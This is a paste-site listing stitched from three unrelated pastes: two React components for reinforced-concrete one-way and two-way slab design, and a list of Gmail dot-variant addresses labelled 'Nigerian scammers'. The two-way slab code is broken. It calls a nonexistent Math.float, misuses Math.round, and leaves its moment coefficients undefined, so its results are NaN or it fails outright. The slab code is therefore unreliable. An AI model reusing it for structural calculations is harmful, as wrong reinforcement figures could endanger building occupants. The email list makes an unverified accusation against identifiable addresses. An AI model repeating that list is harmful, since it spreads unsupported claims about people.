JRbHpNjj,Untitled,lodha1503,JavaScript,Saturday 8th of July 2023 05:21:26 AM CDT,"import React from 'react'

const TwoWaySlab = (props) => {
    var flag=0;
    const choose_positive_min=(value1,value2)=>
    {
      if (value1 >= 0 && value2 >= 0)
      {
        return Math.min(value1, value2);
      }
    
      else if (value1 >= 0)
      {
        return value1;
      }

      else if (value2 >= 0)
      {
        return value2;
      }

      return -1;
    };

    const find_lowest_nearest_multiple_of_10=(num)=>
    {
      
      var nearest_multiple;
      nearest_multiple = Math.floor(num/10);
      nearest_multiple=nearest_multiple*10;
      
      return nearest_multiple;
    };

    const Long_Span=props.breadth;
    const Short_Span=props.length;
    const Live_Load=3.5;
    const Dead_Load=0.25;
    const Concrete_grade = 20,Steel_Strength=415;

    const Depth=Short_Span;
    const Effective_depth = Math.round(Depth*1000);
    const Total_depth = Effective_depth + 20+4;


    const Self_weight = 25*(1)*(Total_depth/1000)  ;
    const Floor_Finish=1;

    const Total_Load = Live_Load + Dead_Load + Self_weight + Floor_Finish;
    const Factored_Load = 1.5*Total_Load;

    const ratio = Math.float(Long_Span) / Math.float(Short_Span);
    const final_ratio = Math.round(ratio, 2);



    var short_negative_momentcoefficient;
    var short_positive_momentcoefficient;
    var long_negative_momentcoefficient;
    var long_positive_momentcoefficient;


    var Negative_shortspan_Moment = short_negative_momentcoefficient*Factored_Load*(Math.pow(Short_Span,2)) ;   

    var Positive_shortspan_Moment = short_positive_momentcoefficient*Factored_Load*(Math.pow(Short_Span,2));
 
    var Negative_longspan_Moment = long_negative_momentcoefficient*Factored_Load*(Math.pow(Short_Span,2));

    var Positive_longspan_Moment = long_positive_momentcoefficient*Factored_Load*(Math.pow(Short_Span,2));

    var Effective_depth_req = (Math.sqrt((Negative_shortspan_Moment*1000000)/(0.138*Concrete_grade*1000)));





    var Ast_min,Maximum_spacing,a,b,c,root1,root2,discriminant,Area_required,dia,area_of_bar,no_of_bar,number,spacing,Spacing,Area_requiredx1,Area_providedx,Area_requiredx2;

    if(Effective_depth_req>Effective_depth)
    {
        Ast_min = (0.0012)*(1000*Total_depth);
        Maximum_spacing = Math.min(3*Effective_depth,300);

        a = (Math.pow((Steel_Strength),2)*0.87)/(Concrete_grade*1000)
        b = -(Steel_Strength*0.87*Effective_depth)
        c = Negative_shortspan_Moment*1000000;

        discriminant = (Math.pow(b,2)) - (4*a*c);

        if (discriminant<0)
        {
          root1=-b/(2*a);
          root2=-b/(2*a);
        }

        else
        {
          root1 = (-b + Math.sqrt(discriminant)) / (2*a);
          root2 = (-b - Math.sqrt(discriminant)) / (2*a);
        }

        Area_requiredx1=choose_positive_min(root1,root2);

        if(Area_requiredx1>=0)
        {
            
            dia = 10;                                                         
            area_of_bar = (3.14*(Math.pow(dia,2)))/4;
            no_of_bar = Area_requiredx1/area_of_bar + 1;
            number = Math.round(no_of_bar);
            spacing = 1000/number;
            Spacing = find_lowest_nearest_multiple_of_10(spacing);

            if (Maximum_spacing>=Spacing)
            {
                Area_providedx = (no_of_bar - 1)*(Math.floor( spacing/ 100) * 100);

                a = (Math.pow((Steel_Strength),2)*0.87)/(Concrete_grade*1000);
                b = -(Steel_Strength*0.87*Effective_depth);
                c = Positive_shortspan_Moment*1000000;

                discriminant = (Math.pow(b,2)) - (4*a*c);

                if (discriminant<0)
                {
                    root1=-b/(2*a);
                    root2=-b/(2*a);
                }

                else
                {
                    root1 = (-b + Math.sqrt(discriminant)) / (2*a);
                    root2 = (-b - Math.sqrt(discriminant)) / (2*a);
                }

                Area_requiredx2=choose_positive_min(root1,root2);

                if (Area_requiredx2>=0)
                {
                    dia=10;
                    area_of_bar = (3.14*(Math.pow(dia,2)))/4;
                    no_of_bar = Area_requiredx2/area_of_bar + 1;
                    number = Math.round(no_of_bar);
                    spacing = 1000/number;
                    Spacing = find_lowest_nearest_multiple_of_10(spacing);

                    if(Maximum_spacing>=Spacing)
                    {

                    }
                    else
                    {
                        alert(""Maximum Spacing < Spacing for Area_reqx2"");
                    }
                }
                else
                {
                    alert(""Required Areax2 is negative"");

                }

            }
            else
            {
                alert(""Maximum Spacing < Spacing for Area_reqx1"")
            }


        }
        else
        {
          alert(""Required Areax1 is negative"");
        }
    }

    else
    {
        alert(""The effective depth selected is not sufficient to resist the design ultimate moment"")
    }












  return (
    <div>
      
    </div>
  )
}

export default TwoWaySlab
"
LZHGTDkV,Untitled,lodha1503,JavaScript,Saturday 8th of July 2023 03:46:54 AM CDT,"import React from 'react'

const OneWaySlab = (props) => 
{
    var flag=0;
    const choose_positive_min=(value1,value2)=>
    {
      if (value1 >= 0 && value2 >= 0)
      {
        return Math.min(value1, value2);
      }
    
      else if (value1 >= 0)
      {
        return value1;
      }

      else if (value2 >= 0)
      {
        return value2;
      }

      return -1;
    };

    const find_lowest_nearest_multiple_of_10=(num)=>
    {
      
      var nearest_multiple;
      nearest_multiple = Math.floor(num/10);
      nearest_multiple=nearest_multiple*10;
      
      return nearest_multiple;
    };

    const Interpolation=(Assume_tensionsteel,pt_percentage,y)=>
    {
      var len=y.length;
      var ans=y[len-1];
      for (let i = 1; i < len; i++) 
      {
        if ((Assume_tensionsteel>=pt_percentage[i-1]) && (Assume_tensionsteel<pt_percentage[i]))
        {
          ans= (((y[i]-y[i-1])/(pt_percentage[i]-pt_percentage[i-1]))*(Assume_tensionsteel-pt_percentage[i-1]))+y[i-1];

          break;
        }
      }

      return ans;
    }
    

    const Long_Span=props.length;
    const Short_Span=props.breadth;
    const Live_Load=3.5;
    const Dead_Load=0.25;
    
    const Floor_Finish=1;

    

    const D=Short_Span/28;
    const Effective_depth=Math.round(D*1000);

    const Total_depth = Effective_depth + 20;
    var Maximum_spacing = Math.min(3*Total_depth,300);

    const width = 300; // Given

    const shorter_effectivespan1 = (Short_Span*1000) + width;
    const longer_effectivespan1 = (Long_Span*1000) + width;
    const shorter_effectivespan2 = Effective_depth + (Short_Span*1000);
    const longer_effectivespan2 = Effective_depth + (Long_Span*1000);

    const shorter_effectivespan = Math.min(shorter_effectivespan1, shorter_effectivespan2);
    const longer_effectivespan = Math.min(longer_effectivespan1,longer_effectivespan2);
    
    const Self_weight = 25*(1)*(Total_depth/1000)  ;

    const Total_Load = Live_Load + Dead_Load + Self_weight + Floor_Finish;

    const Factored_Load = 1.5*Total_Load ;
    const Factored_Moment = (Factored_Load*Math.pow((shorter_effectivespan/1000),2))/8;
    const Factored_shearforce = (Factored_Load*(shorter_effectivespan/1000))/2;

    const Concrete_grade = 20;
    const Steel_Strength = 415;

    const d = Math.sqrt((Factored_Moment*1000000)/(0.1379*1000*Concrete_grade));


    //Variables

    var a,b,c,discriminant,root1,root2,Area_required,dia,area_of_bar,no_of_bar,number,spacing,Spacing,Area_Provided,Min_area_req,fs,pt,kt,x,tau,Assume_tensionsteel,y_value,s,spacing_prov,development_length,Length_of_embedment,embedded_length;

    const Tbd=1.2,wall_width=300;

    const pt_percentage=[0.15,0.25,0.5,0.75,1,1.25,1.5,1.75,2,2.25,2.5,2.75,3];
    const y=[0.28,0.36,0.48,0.56,0.62,0.67,0.72,0.75,0.79,0.81,0.82,0.82,0.82]


    if (Effective_depth>d)
    {
        a = (Math.pow((Steel_Strength),2)*0.87)/(Concrete_grade*1000)
        b = -(Steel_Strength*0.87*Effective_depth)
        c = Factored_Moment*1000000;

        discriminant = (Math.pow(b,2)) - (4*a*c);

        if (discriminant<0)
        {
          root1=-b/(2*a);
          root2=-b/(2*a);
        }

        else
        {
          root1 = (-b + Math.sqrt(discriminant)) / (2*a);
          root2 = (-b - Math.sqrt(discriminant)) / (2*a);
        }

        Area_required=choose_positive_min(root1,root2);

        if (Area_required>0)
        {
          dia = 10;                                                         
          area_of_bar = (3.14*(Math.pow(dia,2)))/4;
          no_of_bar = Area_required/area_of_bar + 1;
          number = Math.round(no_of_bar);
          spacing = 1000/number;
          Spacing = find_lowest_nearest_multiple_of_10(spacing);
          
          if (Maximum_spacing>=Spacing)
          {
            Area_Provided = (1000/Spacing)*area_of_bar;
            Min_area_req = 0.0012*Total_depth*1000;
            
            if(Area_Provided>=Min_area_req && Area_Provided>=Area_required)
            {
              
              fs = (0.58*Steel_Strength*Area_required)/Area_Provided;
              pt = (Area_Provided/(1000*Total_depth))*100;
              kt=1 / (0.225 + 0.00322 * fs - 0.625 * Math.log10(1/pt));
              x = 20*kt;

              

              if (x>=Short_Span/D)
              {
                tau = (Factored_shearforce*1000)/(1000*Total_depth);
                Assume_tensionsteel = pt/2;
                y_value=Interpolation(Assume_tensionsteel,pt_percentage,y);
                
                
                if (y_value>=tau)
                {
                  s = Math.min(5*Effective_depth,450);
                  
                  if (s>=Spacing)
                  {
                    spacing_prov = (Math.floor(Spacing/ 10)) * 10;
                    
                    development_length = (0.87*Steel_Strength*dia)/(4*1.6*Tbd);
                    console.log(development_length);

                    embedded_length = development_length/3;
                    Length_of_embedment = wall_width - 30 ;
                    if ((Length_of_embedment>embedded_length))
                    {
                      flag=1;
                    }
                    else
                    {
                      alert(Length_of_embedment<embedded_length);
                    }
                    
                    
                  }

                  else
                  {
                    alert(""s<Spacing"");
                  }
                }

                else
                {
                  alert(""y_value<tau"")
                }

              }
              else
              {
                alert(""x < Short_Span/D"")
              }
  

            }
            else
            {
              if(Area_Provided<Min_area_req && Area_Provided<Area_required)
              {
                alert(""Area_Provided<Min_area_req && Area_Provided<Area_required"");
              }
              else if(Area_Provided<Min_area_req)
              {
                alert(""Area_Provided<Min_area_req"");
              }

              else if(Area_Provided<Area_required)
              {
                alert(""Area_Provided<Area_required"");
              }

            }
             
             
          }

          else
          {
            alert(""Maximum Spacing is less than Spacing"");
          }



          
        }

        else
        {
          alert(""Required Area is negative"");
        }

        
    }

    else
    {
      alert(""EFFECTIVE_DEPTH EXCEEDS D"");
    }


        

          
        
              
  
  return (
    <>
    One Way Slab
    {flag==1?<p>Area of Reinforcement Required is : {Area_required} <br />
                Area of Reinforcement Provided is : {Area_Provided} <br />
                Number of Bars Provided : {number}
    </p>:""""}
    </>
   
  )
}

export default OneWaySlab

"
UagVAX6u,Nigerian scammers [8-7-1/2023],bombaires,Unicon,Saturday 8th of July 2023 03:22:03 AM CDT,"<a href=""mailto:jinnassociates@yahoo.com"">jinnassociates@yahoo.com</a>
<a href=""mailto:jjwjwong@zohomail.com"">jjwjwong@zohomail.com</a>
<a href=""mailto:mrjtchristopher@gmail.com"">mrjtchristopher@gmail.com</a>
<a href=""mailto:m.rjt.ch.ri.st.o.p.her@gmail.com"">m.rjt.ch.ri.st.o.p.her@gmail.com</a>
<a href=""mailto:mrjtchr.i.sto.p.h.e.r@gmail.com"">mrjtchr.i.sto.p.h.e.r@gmail.com</a>
<a href=""mailto:m.rjtc.h.r.i.s.to.p.h.er@gmail.com"">m.rjtc.h.r.i.s.to.p.h.er@gmail.com</a>
<a href=""mailto:m.r.j.tc.h.r.i.stophe.r@gmail.com"">m.r.j.tc.h.r.i.stophe.r@gmail.com</a>
<a href=""mailto:m.r.jtc.h.ristop.her@gmail.com"">m.r.jtc.h.ristop.her@gmail.com</a>
<a href=""mailto:m.rj.tc.hr.ist.opher@gmail.com"">m.rj.tc.hr.ist.opher@gmail.com</a>
<a href=""mailto:m.r.j.tch.ri.s.t.op.he.r@gmail.com"">m.r.j.tch.ri.s.t.op.he.r@gmail.com</a>
<a href=""mailto:mr.jt.ch.ri.s.toph.e.r@gmail.com"">mr.jt.ch.ri.s.toph.e.r@gmail.com</a>
<a href=""mailto:mr.jtc.h.r.is.to.ph.er@gmail.com"">mr.jtc.h.r.is.to.ph.er@gmail.com</a>
<a href=""mailto:m.r.j.tchri.st.o.ph.e.r@gmail.com"">m.r.j.tchri.st.o.ph.e.r@gmail.com</a>
<a href=""mailto:mrjt.ch.ri.st.o.p.her@gmail.com"">mrjt.ch.ri.st.o.p.her@gmail.com</a>
<a href=""mailto:m.rj.tchr.i.s.t.opher@gmail.com"">m.rj.tchr.i.s.t.opher@gmail.com</a>
<a href=""mailto:m.r.j.t.chr.is.t.op.her@gmail.com"">m.r.j.t.chr.is.t.op.her@gmail.com</a>
<a href=""mailto:mr.jt.ch.r.i.st.o.p.h.er@gmail.com"">mr.jt.ch.r.i.st.o.p.h.er@gmail.com</a>
<a href=""mailto:mrj.t.ch.rist.op.her@gmail.com"">mrj.t.ch.rist.op.her@gmail.com</a>
<a href=""mailto:mr.j.t.c.h.r.is.t.o.pher@gmail.com"">mr.j.t.c.h.r.is.t.o.pher@gmail.com</a>
<a href=""mailto:mr.j.tch.r.i.s.t.o.p.h.e.r@gmail.com"">mr.j.tch.r.i.s.t.o.p.h.e.r@gmail.com</a>
<a href=""mailto:m.rjt.ch.r.ist.oph.e.r@gmail.com"">m.rjt.ch.r.ist.oph.e.r@gmail.com</a>
<a href=""mailto:m.rj.t.c.hr.i.s.tophe.r@gmail.com"">m.rj.t.c.hr.i.s.tophe.r@gmail.com</a>
<a href=""mailto:mr.j.t.c.h.ri.sto.ph.er@gmail.com"">mr.j.t.c.h.ri.sto.ph.er@gmail.com</a>
<a href=""mailto:mrjt.chri.st.o.ph.er@gmail.com"">mrjt.chri.st.o.ph.er@gmail.com</a>
<a href=""mailto:m.rjt.c.h.r.i.sto.p.h.e.r@gmail.com"">m.rjt.c.h.r.i.sto.p.h.e.r@gmail.com</a>
<a href=""mailto:m.rjtch.ri.st.o.p.her@gmail.com"">m.rjtch.ri.st.o.p.her@gmail.com</a>
<a href=""mailto:m.r.j.tch.ris.to.phe.r@gmail.com"">m.r.j.tch.ris.to.phe.r@gmail.com</a>
<a href=""mailto:mr.jt.c.h.r.isto.phe.r@gmail.com"">mr.jt.c.h.r.isto.phe.r@gmail.com</a>
<a href=""mailto:m.r.jtchr.is.toph.e.r@gmail.com"">m.r.jtchr.is.toph.e.r@gmail.com</a>
<a href=""mailto:m.r.j.tch.ri.s.top.h.er@gmail.com"">m.r.j.tch.ri.s.top.h.er@gmail.com</a>
<a href=""mailto:m.r.jt.c.hri.st.oph.e.r@gmail.com"">m.r.jt.c.hri.st.oph.e.r@gmail.com</a>
<a href=""mailto:mr.jt.c.hri.st.o.p.h.er@gmail.com"">mr.jt.c.hri.st.o.p.h.er@gmail.com</a>
<a href=""mailto:m.r.jt.chr.i.st.o.phe.r@gmail.com"">m.r.jt.chr.i.st.o.phe.r@gmail.com</a>
<a href=""mailto:mrjt.c.h.ri.sto.ph.e.r@gmail.com"">mrjt.c.h.ri.sto.ph.e.r@gmail.com</a>
<a href=""mailto:m.r.j.tc.hris.t.o.p.h.er@gmail.com"">m.r.j.tc.hris.t.o.p.h.er@gmail.com</a>
<a href=""mailto:mrjt.chri.st.oph.er@gmail.com"">mrjt.chri.st.oph.er@gmail.com</a>
<a href=""mailto:m.rj.tchri.s.t.o.p.h.e.r@gmail.com"">m.rj.tchri.s.t.o.p.h.e.r@gmail.com</a>
<a href=""mailto:mrj.tch.ri.s.to.ph.er@gmail.com"">mrj.tch.ri.s.to.ph.er@gmail.com</a>
<a href=""mailto:m.r.j.tchri.stop.he.r@gmail.com"">m.r.j.tchri.stop.he.r@gmail.com</a>
<a href=""mailto:mr.j.tch.r.i.stop.her@gmail.com"">mr.j.tch.r.i.stop.her@gmail.com</a>
<a href=""mailto:m.rjtc.h.r.is.t.o.p.her@gmail.com"">m.rjtc.h.r.is.t.o.p.her@gmail.com</a>
<a href=""mailto:mrjt.ch.rist.o.p.h.e.r@gmail.com"">mrjt.ch.rist.o.p.h.e.r@gmail.com</a>
<a href=""mailto:m.rj.tc.hr.i.s.t.o.phe.r@gmail.com"">m.rj.tc.hr.i.s.t.o.phe.r@gmail.com</a>
<a href=""mailto:m.rj.tc.hrist.o.p.he.r@gmail.com"">m.rj.tc.hrist.o.p.he.r@gmail.com</a>
<a href=""mailto:mrj.tc.h.r.is.t.o.p.h.e.r@gmail.com"">mrj.tc.h.r.is.t.o.p.h.e.r@gmail.com</a>
<a href=""mailto:mr.j.tc.h.r.i.st.o.phe.r@gmail.com"">mr.j.tc.h.r.i.st.o.phe.r@gmail.com</a>
<a href=""mailto:mr.j.t.c.hri.sto.ph.er@gmail.com"">mr.j.t.c.hri.sto.ph.er@gmail.com</a>
<a href=""mailto:m.rjtchrist.op.he.r@gmail.com"">m.rjtchrist.op.he.r@gmail.com</a>
<a href=""mailto:mr.jtc.hr.i.stopher@gmail.com"">mr.jtc.hr.i.stopher@gmail.com</a>
<a href=""mailto:m.r.jt.ch.r.is.t.op.h.er@gmail.com"">m.r.jt.ch.r.is.t.op.h.er@gmail.com</a>
<a href=""mailto:mr.j.t.christop.h.er@gmail.com"">mr.j.t.christop.h.er@gmail.com</a>
<a href=""mailto:m.r.j.t.ch.ris.topher@gmail.com"">m.r.j.t.ch.ris.topher@gmail.com</a>
<a href=""mailto:m.rj.t.ch.ri.s.to.ph.e.r@gmail.com"">m.rj.t.ch.ri.s.to.ph.e.r@gmail.com</a>
<a href=""mailto:mrjtc.hr.isto.ph.er@gmail.com"">mrjtc.hr.isto.ph.er@gmail.com</a>
<a href=""mailto:m.rj.tc.h.ris.top.he.r@gmail.com"">m.rj.tc.h.ris.top.he.r@gmail.com</a>
<a href=""mailto:mr.jt.c.hris.t.opher@gmail.com"">mr.jt.c.hris.t.opher@gmail.com</a>
<a href=""mailto:m.rj.t.ch.r.i.sto.p.h.er@gmail.com"">m.rj.t.ch.r.i.sto.p.h.er@gmail.com</a>
<a href=""mailto:m.r.jtch.ristopher@gmail.com"">m.r.jtch.ristopher@gmail.com</a>
<a href=""mailto:mr.j.t.ch.rist.ophe.r@gmail.com"">mr.j.t.ch.rist.ophe.r@gmail.com</a>
<a href=""mailto:m.r.j.t.ch.r.i.s.t.o.p.her@gmail.com"">m.r.j.t.ch.r.i.s.t.o.p.her@gmail.com</a>
<a href=""mailto:m.r.jtc.h.r.is.t.o.p.h.e.r@gmail.com"">m.r.jtc.h.r.is.t.o.p.h.e.r@gmail.com</a>
<a href=""mailto:m.rjt.chr.istoph.er@gmail.com"">m.rjt.chr.istoph.er@gmail.com</a>
<a href=""mailto:m.rj.tchr.i.s.to.pher@gmail.com"">m.rj.tchr.i.s.to.pher@gmail.com</a>
<a href=""mailto:m.rjt.c.hr.is.topher@gmail.com"">m.rjt.c.hr.is.topher@gmail.com</a>
<a href=""mailto:m.r.jt.chr.i.s.to.p.her@gmail.com"">m.r.jt.chr.i.s.to.p.her@gmail.com</a>
<a href=""mailto:mrjt.ch.rist.oph.e.r@gmail.com"">mrjt.ch.rist.oph.e.r@gmail.com</a>
<a href=""mailto:mr.j.tc.h.r.is.to.ph.e.r@gmail.com"">mr.j.tc.h.r.is.to.ph.e.r@gmail.com</a>
<a href=""mailto:m.rj.t.c.hr.ist.o.pher@gmail.com"">m.rj.t.c.hr.ist.o.pher@gmail.com</a>
<a href=""mailto:mr.jtch.r.isto.ph.er@gmail.com"">mr.jtch.r.isto.ph.er@gmail.com</a>
<a href=""mailto:m.rj.t.ch.r.ist.o.p.h.e.r@gmail.com"">m.rj.t.ch.r.ist.o.p.h.e.r@gmail.com</a>
<a href=""mailto:mrjt.chr.is.to.p.he.r@gmail.com"">mrjt.chr.is.to.p.he.r@gmail.com</a>
<a href=""mailto:mr.j.t.ch.ris.top.h.e.r@gmail.com"">mr.j.t.ch.ris.top.h.e.r@gmail.com</a>
<a href=""mailto:m.rj.t.c.h.ris.t.o.ph.e.r@gmail.com"">m.rj.t.c.h.ris.t.o.ph.e.r@gmail.com</a>
<a href=""mailto:m.r.jt.chr.i.s.to.p.he.r@gmail.com"">m.r.jt.chr.i.s.to.p.he.r@gmail.com</a>
<a href=""mailto:m.rjtchr.i.st.oph.e.r@gmail.com"">m.rjtchr.i.st.oph.e.r@gmail.com</a>
<a href=""mailto:m.r.j.tch.r.is.to.p.her@gmail.com"">m.r.j.tch.r.is.to.p.her@gmail.com</a>
<a href=""mailto:m.rjtchr.i.s.toph.er@gmail.com"">m.rjtchr.i.s.toph.er@gmail.com</a>
<a href=""mailto:m.rjtc.hri.st.o.p.h.er@gmail.com"">m.rjtc.hri.st.o.p.h.er@gmail.com</a>
<a href=""mailto:mrjt.c.h.r.ist.o.p.he.r@gmail.com"">mrjt.c.h.r.ist.o.p.he.r@gmail.com</a>
<a href=""mailto:m.rj.t.c.hri.stopher@gmail.com"">m.rj.t.c.hri.stopher@gmail.com</a>
<a href=""mailto:m.r.jtchr.ist.o.p.h.e.r@gmail.com"">m.r.jtchr.ist.o.p.h.e.r@gmail.com</a>
<a href=""mailto:m.r.j.tc.hris.t.oph.er@gmail.com"">m.r.j.tc.hris.t.oph.er@gmail.com</a>
<a href=""mailto:m.rj.t.c.hri.s.t.op.her@gmail.com"">m.rj.t.c.hri.s.t.op.her@gmail.com</a>
<a href=""mailto:m.r.j.t.c.h.ri.sto.p.her@gmail.com"">m.r.j.t.c.h.ri.sto.p.her@gmail.com</a>
<a href=""mailto:mr.jt.c.hr.is.t.o.ph.e.r@gmail.com"">mr.jt.c.hr.is.t.o.ph.e.r@gmail.com</a>
<a href=""mailto:mr.jtc.hri.st.op.h.e.r@gmail.com"">mr.jtc.hri.st.op.h.e.r@gmail.com</a>
<a href=""mailto:m.rjtchr.i.stoph.e.r@gmail.com"">m.rjtchr.i.stoph.e.r@gmail.com</a>
<a href=""mailto:m.rj.tch.r.is.t.op.h.e.r@gmail.com"">m.rj.tch.r.is.t.op.h.e.r@gmail.com</a>
<a href=""mailto:m.r.jtchr.is.to.ph.er@gmail.com"">m.r.jtchr.is.to.ph.er@gmail.com</a>
<a href=""mailto:mr.j.tc.hr.i.s.t.o.ph.er@gmail.com"">mr.j.tc.hr.i.s.t.o.ph.er@gmail.com</a>
<a href=""mailto:mrj.t.chr.istopher@gmail.com"">mrj.t.chr.istopher@gmail.com</a>
<a href=""mailto:m.r.j.t.chr.istoph.er@gmail.com"">m.r.j.t.chr.istoph.er@gmail.com</a>
<a href=""mailto:m.r.jt.ch.r.is.top.he.r@gmail.com"">m.r.jt.ch.r.is.top.he.r@gmail.com</a>
<a href=""mailto:m.r.j.tch.rist.o.p.h.er@gmail.com"">m.r.j.tch.rist.o.p.h.er@gmail.com</a>
<a href=""mailto:mrjtchr.i.st.ophe.r@gmail.com"">mrjtchr.i.st.ophe.r@gmail.com</a>
<a href=""mailto:mr.jtchris.t.o.phe.r@gmail.com"">mr.jtchris.t.o.phe.r@gmail.com</a>
<a href=""mailto:m.r.j.tch.r.is.to.ph.er@gmail.com"">m.r.j.tch.r.is.to.ph.er@gmail.com</a>
<a href=""mailto:m.rjt.chri.st.ophe.r@gmail.com"">m.rjt.chri.st.ophe.r@gmail.com</a>
<a href=""mailto:mrjt.chris.t.opher@gmail.com"">mrjt.chris.t.opher@gmail.com</a>
<a href=""mailto:mr.j.t.ch.r.i.s.top.h.er@gmail.com"">mr.j.t.ch.r.i.s.top.h.er@gmail.com</a>
<a href=""mailto:mrj.tc.h.ri.stop.h.er@gmail.com"">mrj.tc.h.ri.stop.h.er@gmail.com</a>
<a href=""mailto:mrj.tc.hrist.oph.er@gmail.com"">mrj.tc.hrist.oph.er@gmail.com</a>
<a href=""mailto:mrjtchr.i.s.t.o.ph.er@gmail.com"">mrjtchr.i.s.t.o.ph.er@gmail.com</a>
<a href=""mailto:mrjt.c.hr.is.t.oph.er@gmail.com"">mrjt.c.hr.is.t.oph.er@gmail.com</a>
<a href=""mailto:m.r.j.t.ch.ri.s.to.pher@gmail.com"">m.r.j.t.ch.ri.s.to.pher@gmail.com</a>
<a href=""mailto:m.rjtc.hr.is.toph.e.r@gmail.com"">m.rjtc.hr.is.toph.e.r@gmail.com</a>
<a href=""mailto:mrj.tc.hrist.o.ph.e.r@gmail.com"">mrj.tc.hrist.o.ph.e.r@gmail.com</a>
<a href=""mailto:mr.j.tc.hr.is.top.h.er@gmail.com"">mr.j.tc.hr.is.top.h.er@gmail.com</a>
<a href=""mailto:m.r.jt.chr.is.top.her@gmail.com"">m.r.jt.chr.is.top.her@gmail.com</a>
<a href=""mailto:mr.jtc.h.r.is.t.o.p.h.er@gmail.com"">mr.jtc.h.r.is.t.o.p.h.er@gmail.com</a>
<a href=""mailto:m.rj.t.chr.istop.her@gmail.com"">m.rj.t.chr.istop.her@gmail.com</a>
<a href=""mailto:m.rj.tch.r.i.stopher@gmail.com"">m.rj.tch.r.i.stopher@gmail.com</a>
<a href=""mailto:m.rj.t.ch.r.i.stop.he.r@gmail.com"">m.rj.t.ch.r.i.stop.he.r@gmail.com</a>
<a href=""mailto:m.r.j.t.chr.i.st.o.ph.er@gmail.com"">m.r.j.t.chr.i.st.o.ph.er@gmail.com</a>
<a href=""mailto:mr.jtc.h.r.i.s.to.p.he.r@gmail.com"">mr.jtc.h.r.i.s.to.p.he.r@gmail.com</a>
<a href=""mailto:mr.jtchr.is.topher@gmail.com"">mr.jtchr.is.topher@gmail.com</a>
<a href=""mailto:m.r.jtch.r.i.s.to.ph.er@gmail.com"">m.r.jtch.r.i.s.to.ph.er@gmail.com</a>
<a href=""mailto:m.r.jt.c.h.ri.st.o.p.he.r@gmail.com"">m.r.jt.c.h.ri.st.o.p.he.r@gmail.com</a>
<a href=""mailto:mr.jtch.ris.top.h.er@gmail.com"">mr.jtch.ris.top.h.er@gmail.com</a>
<a href=""mailto:m.r.jtch.r.i.stop.h.er@gmail.com"">m.r.jtch.r.i.stop.h.er@gmail.com</a>
<a href=""mailto:m.r.jt.c.h.ri.sto.p.h.e.r@gmail.com"">m.r.jt.c.h.ri.sto.p.h.e.r@gmail.com</a>
<a href=""mailto:mrjtc.h.r.ist.o.p.he.r@gmail.com"">mrjtc.h.r.ist.o.p.he.r@gmail.com</a>
<a href=""mailto:m.r.j.t.chris.t.o.p.h.e.r@gmail.com"">m.r.j.t.chris.t.o.p.h.e.r@gmail.com</a>
<a href=""mailto:mr.j.t.c.h.ri.s.toph.er@gmail.com"">mr.j.t.c.h.ri.s.toph.er@gmail.com</a>
<a href=""mailto:m.r.j.t.christopher@gmail.com"">m.r.j.t.christopher@gmail.com</a>
<a href=""mailto:mr.j.tc.hri.st.ophe.r@gmail.com"">mr.j.tc.hri.st.ophe.r@gmail.com</a>
<a href=""mailto:mrj.t.c.hr.is.t.opher@gmail.com"">mrj.t.c.hr.is.t.opher@gmail.com</a>
<a href=""mailto:m.rjt.c.hri.sto.p.he.r@gmail.com"">m.rjt.c.hri.sto.p.he.r@gmail.com</a>
<a href=""mailto:mrjtc.hr.i.st.o.phe.r@gmail.com"">mrjtc.hr.i.st.o.phe.r@gmail.com</a>
<a href=""mailto:m.r.jt.ch.r.is.top.h.e.r@gmail.com"">m.r.jt.ch.r.is.top.h.e.r@gmail.com</a>
<a href=""mailto:mrjtc.h.r.ist.opher@gmail.com"">mrjtc.h.r.ist.opher@gmail.com</a>
<a href=""mailto:mrj.tch.r.is.t.op.her@gmail.com"">mrj.tch.r.is.t.op.her@gmail.com</a>
<a href=""mailto:mr.j.tc.h.ri.sto.p.her@gmail.com"">mr.j.tc.h.ri.sto.p.her@gmail.com</a>
<a href=""mailto:m.r.jt.chris.top.her@gmail.com"">m.r.jt.chris.top.her@gmail.com</a>
<a href=""mailto:mr.jt.chri.st.ophe.r@gmail.com"">mr.jt.chri.st.ophe.r@gmail.com</a>
<a href=""mailto:mr.jt.c.hr.i.st.op.h.e.r@gmail.com"">mr.jt.c.hr.i.st.op.h.e.r@gmail.com</a>
<a href=""mailto:mrj.t.c.h.r.is.to.pher@gmail.com"">mrj.t.c.h.r.is.to.pher@gmail.com</a>
<a href=""mailto:m.rj.tc.h.ri.sto.phe.r@gmail.com"">m.rj.tc.h.ri.sto.phe.r@gmail.com</a>
<a href=""mailto:mrjtc.hri.st.op.h.e.r@gmail.com"">mrjtc.hri.st.op.h.e.r@gmail.com</a>
<a href=""mailto:mr.jtc.h.ri.sto.pher@gmail.com"">mr.jtc.h.ri.sto.pher@gmail.com</a>
<a href=""mailto:m.r.jtc.h.r.i.stopher@gmail.com"">m.r.jtc.h.r.i.stopher@gmail.com</a>
<a href=""mailto:mrj.t.c.hr.istophe.r@gmail.com"">mrj.t.c.hr.istophe.r@gmail.com</a>
<a href=""mailto:mrjt.c.h.ris.t.op.h.er@gmail.com"">mrjt.c.h.ris.t.op.h.er@gmail.com</a>
<a href=""mailto:m.rjtchr.ist.op.her@gmail.com"">m.rjtchr.ist.op.her@gmail.com</a>
<a href=""mailto:mr.jtc.hris.tophe.r@gmail.com"">mr.jtc.hris.tophe.r@gmail.com</a>
<a href=""mailto:m.rj.t.c.h.r.i.stoph.e.r@gmail.com"">m.rj.t.c.h.r.i.stoph.e.r@gmail.com</a>
<a href=""mailto:m.rj.t.c.h.ristop.h.er@gmail.com"">m.rj.t.c.h.ristop.h.er@gmail.com</a>
<a href=""mailto:m.rj.tchr.i.s.to.p.h.e.r@gmail.com"">m.rj.tchr.i.s.to.p.h.e.r@gmail.com</a>
<a href=""mailto:mr.jtc.h.r.i.s.t.o.ph.er@gmail.com"">mr.jtc.h.r.i.s.t.o.ph.er@gmail.com</a>
<a href=""mailto:mr.jtch.ri.stophe.r@gmail.com"">mr.jtch.ri.stophe.r@gmail.com</a>
<a href=""mailto:mrj.t.chr.i.s.t.o.ph.e.r@gmail.com"">mrj.t.chr.i.s.t.o.ph.e.r@gmail.com</a>
<a href=""mailto:mrjt.c.h.r.ist.o.p.her@gmail.com"">mrjt.c.h.r.ist.o.p.her@gmail.com</a>
<a href=""mailto:mr.jtc.hr.i.s.to.ph.er@gmail.com"">mr.jtc.hr.i.s.to.ph.er@gmail.com</a>
<a href=""mailto:m.rjt.ch.ri.s.t.o.pher@gmail.com"">m.rjt.ch.ri.s.t.o.pher@gmail.com</a>
